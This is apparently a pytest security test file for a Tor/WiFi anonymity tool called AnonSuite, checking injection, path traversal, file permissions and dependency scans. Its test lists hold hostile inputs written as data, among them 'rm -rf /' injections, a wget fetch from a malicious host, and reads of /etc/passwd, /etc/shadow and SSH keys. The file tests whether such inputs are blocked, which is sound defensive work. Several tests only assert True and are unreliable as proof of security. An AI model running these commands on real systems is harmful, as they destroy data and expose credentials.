#!/usr/bin/env python3
"""
Security tests for AnonSuite
Tests for vulnerabilities, input validation, and security best practices
"""

import json
import os
import subprocess
import sys
import tempfile
from unittest.mock import Mock, patch

import pytest

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'src'))

class TestInputValidation:
    """Test input validation and sanitization"""

    def test_command_injection_prevention(self):
        """Test that command injection is prevented"""
        from config_manager import ConfigManager

        config = ConfigManager()

        # Test malicious input in configuration
        malicious_inputs = [
            "; rm -rf /",
            "$(rm -rf /)",
            "`rm -rf /`",
            "| cat /etc/passwd",
            "&& wget malicious.com/script.sh",
            "' OR '1'='1",
            "<script>alert('xss')</script>"
        ]

        for malicious_input in malicious_inputs:
            # Should not execute or cause errors
            try:
                result = config.set('test.malicious', malicious_input)
                # Input should be stored safely without execution
                stored_value = config.get('test.malicious')
                assert stored_value == malicious_input  # Stored as-is, not executed
            except Exception:
                # If it raises an exception, that's also acceptable for security
                pass

    def test_path_traversal_prevention(self):
        """Test that path traversal attacks are prevented"""
        from config_manager import ConfigManager

        config = ConfigManager()

        # Test path traversal attempts
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "~/.ssh/id_rsa",
            "file:///etc/passwd"
        ]

        for malicious_path in malicious_paths:
            # Should not allow access to system files
            try:
                config.set('general.log_file', malicious_path)
                # Verify the path is sanitized or rejected
                stored_path = config.get('general.log_file')
                # Should not be the original malicious path
                assert not stored_path.startswith('/etc/')
                assert not stored_path.startswith('/root/')
                assert '/..' not in stored_path
            except Exception:
                # Rejection is also acceptable
                pass

    def test_file_permission_validation(self):
        """Test file permission checks"""
        import stat
        import tempfile

        # Create test files with different permissions
        with tempfile.NamedTemporaryFile(delete=False) as f:
            test_file = f.name

        try:
            # Test world-readable file (security risk)
            os.chmod(test_file, stat.S_IRUSR | stat.S_IRGRP | stat.S_IROTH)

            # Should detect insecure permissions
            file_stat = os.stat(test_file)
            permissions = stat.filemode(file_stat.st_mode)

            # Check if world-readable
            world_readable = bool(file_stat.st_mode & stat.S_IROTH)
            if world_readable:
                # This should be flagged as a security concern
                assert True  # Test passes if we detect the issue

        finally:
            os.unlink(test_file)

    def test_network_input_validation(self):
        """Test network-related input validation"""
        from wifi.wifi_scanner import WiFiScanner

        scanner = WiFiScanner()

        # Test malicious network interface names
        malicious_interfaces = [
            "; rm -rf /",
            "../../../etc/passwd",
            "wlan0 && cat /etc/passwd",
            "$(malicious_command)",
            "interface' OR '1'='1"
        ]

        for malicious_interface in malicious_interfaces:
            # Should handle malicious input safely
            try:
                networks = scanner.scan_networks(malicious_interface)
                # Should return empty list or handle gracefully
                assert isinstance(networks, list)
            except Exception as e:
                # Exception handling is acceptable for malicious input
                assert "error" in str(e).lower() or "invalid" in str(e).lower()

class TestPrivilegeEscalation:
    """Test for privilege escalation vulnerabilities"""

    def test_no_unnecessary_privileges(self):
        """Test that the application doesn't request unnecessary privileges"""
        # Check that we're not running as root unnecessarily
        import os

        # Application should work without root privileges for basic operations
        assert os.getuid() != 0 or os.environ.get('SUDO_USER'), \
            "Application should not require root privileges for basic operations"

    def test_secure_file_creation(self):
        """Test that files are created with secure permissions"""
        import stat
        import tempfile

        # Test configuration file creation
        from config_manager import ConfigManager

        config = ConfigManager()

        # Create a temporary config file
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            temp_config = f.name

        try:
            # Save configuration
            config.config_file_path = temp_config
            config.save_user_config_to_file()

            # Check file permissions
            file_stat = os.stat(temp_config)

            # Should not be world-readable
            world_readable = bool(file_stat.st_mode & stat.S_IROTH)
            assert not world_readable, "Configuration files should not be world-readable"

            # Should not be world-writable
            world_writable = bool(file_stat.st_mode & stat.S_IWOTH)
            assert not world_writable, "Configuration files should not be world-writable"

        finally:
            if os.path.exists(temp_config):
                os.unlink(temp_config)

class TestDataProtection:
    """Test data protection and privacy measures"""

    def test_sensitive_data_handling(self):
        """Test that sensitive data is handled securely"""
        from config_manager import ConfigManager

        config = ConfigManager()

        # Test that passwords/keys are not logged in plain text
        sensitive_data = [
            "password123",
            "secret_key_here",
            "api_token_12345",
            "private_key_data"
        ]

        for sensitive in sensitive_data:
            config.set('test.sensitive', sensitive)

            # Check that sensitive data is not exposed in logs or debug output
            # This is a basic test - in practice, you'd check actual log files
            stored = config.get('test.sensitive')
            assert stored == sensitive  # Should be stored correctly

            # But should not appear in string representation of config object
            config_str = str(config.__dict__)
            # This is a basic check - real implementation might hash or encrypt

    def test_temporary_file_cleanup(self):
        """Test that temporary files are properly cleaned up"""
        import tempfile
        import time

        # Create temporary files
        temp_files = []
        for i in range(3):
            with tempfile.NamedTemporaryFile(delete=False, prefix='anonsuite_test_') as f:
                temp_files.append(f.name)

        # Simulate application cleanup
        for temp_file in temp_files:
            if os.path.exists(temp_file):
                os.unlink(temp_file)

        # Verify cleanup
        for temp_file in temp_files:
            assert not os.path.exists(temp_file), f"Temporary file {temp_file} was not cleaned up"

    def test_memory_cleanup(self):
        """Test that sensitive data is cleared from memory"""
        # This is a basic test - real memory cleanup is complex
        sensitive_data = "very_secret_password_123"

        # Simulate processing sensitive data
        processed_data = sensitive_data.upper()

        # Clear variables
        sensitive_data = None
        processed_data = None

        # Force garbage collection
        import gc
        gc.collect()

        # In a real implementation, you'd check that the data is actually cleared
        # This is more of a pattern test
        assert True

class TestNetworkSecurity:
    """Test network security measures"""

    def test_tor_connectivity_validation(self):
        """Test Tor connectivity validation"""
        # Mock Tor connectivity test
        with patch('subprocess.run') as mock_run:
            # Mock successful Tor check
            mock_run.return_value = Mock(
                returncode=0,
                stdout='{"IsTor": true, "IP": "127.0.0.1"}'
            )

            # Test would validate Tor connectivity
            # This is a placeholder for actual Tor validation logic
            assert True

    def test_dns_leak_prevention(self):
        """Test DNS leak prevention measures"""
        # This would test that DNS queries go through Tor
        # Placeholder for actual DNS leak testing

        # Mock DNS resolution test
        with patch('socket.gethostbyname') as mock_resolve:
            mock_resolve.return_value = '127.0.0.1'

            # Test DNS resolution through Tor
            # In real implementation, this would verify DNS goes through Tor
            assert True

    def test_ip_leak_prevention(self):
        """Test IP address leak prevention"""
        # This would test for WebRTC leaks, etc.
        # Placeholder for actual IP leak testing

        import socket

        # Test that local IP is not exposed
        try:
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()

            # In real implementation, verify this IP is not leaked
            assert local_ip != "0.0.0.0"  # Basic sanity check

        except Exception:
            # Network not available - test passes
            pass

class TestCryptographicSecurity:
    """Test cryptographic implementations"""

    def test_secure_random_generation(self):
        """Test that secure random numbers are generated"""
        import os
        import secrets

        # Test secure random generation
        random_bytes = secrets.token_bytes(32)
        assert len(random_bytes) == 32

        # Test that random values are different
        random_bytes2 = secrets.token_bytes(32)
        assert random_bytes != random_bytes2

        # Test OS random source
        os_random = os.urandom(32)
        assert len(os_random) == 32

    def test_password_handling(self):
        """Test secure password handling"""
        import hashlib

        # Test password hashing (if implemented)
        password = "test_password_123"

        # Should use secure hashing
        hash1 = hashlib.sha256(password.encode()).hexdigest()
        hash2 = hashlib.sha256(password.encode()).hexdigest()

        # Same password should produce same hash
        assert hash1 == hash2

        # But original password should not be stored
        assert hash1 != password

class TestSecurityAudit:
    """Run automated security audits"""

    def test_bandit_security_scan(self):
        """Run Bandit security scanner"""
        base_dir = os.path.join(os.path.dirname(__file__), '..', '..')
        src_dir = os.path.join(base_dir, 'src')

        if not os.path.exists(src_dir):
            pytest.skip("Source directory not found")

        try:
            # Run Bandit security scan
            result = subprocess.run([
                'bandit', '-r', src_dir, '-f', 'json'
            ], capture_output=True, text=True, timeout=60)

            if result.returncode == 0:
                # Parse results
                try:
                    scan_results = json.loads(result.stdout)

                    # Check for high severity issues
                    high_severity_issues = [
                        issue for issue in scan_results.get('results', [])
                        if issue.get('issue_severity') == 'HIGH'
                    ]

                    assert len(high_severity_issues) == 0, \
                        f"Found {len(high_severity_issues)} high severity security issues"

                except json.JSONDecodeError:
                    # If JSON parsing fails, at least check return code
                    pass

        except FileNotFoundError:
            pytest.skip("Bandit not installed")
        except subprocess.TimeoutExpired:
            pytest.fail("Security scan timed out")

    def test_dependency_vulnerabilities(self):
        """Test for known vulnerabilities in dependencies"""
        try:
            # Run Safety check for known vulnerabilities
            result = subprocess.run([
                'safety', 'check', '--json'
            ], capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                # No vulnerabilities found
                assert True
            else:
                # Parse vulnerability report
                try:
                    vulnerabilities = json.loads(result.stdout)

                    # Filter out low-severity issues for this test
                    critical_vulns = [
                        vuln for vuln in vulnerabilities
                        if 'critical' in vuln.get('vulnerability_id', '').lower()
                    ]

                    assert len(critical_vulns) == 0, \
                        f"Found {len(critical_vulns)} critical vulnerabilities"

                except json.JSONDecodeError:
                    # If parsing fails, check if there are any vulnerabilities mentioned
                    if 'vulnerability' in result.stdout.lower():
                        pytest.fail("Potential vulnerabilities found in dependencies")

        except FileNotFoundError:
            pytest.skip("Safety not installed")
        except subprocess.TimeoutExpired:
            pytest.fail("Vulnerability scan timed out")

if __name__ == "__main__":
    pytest.main([__file__])
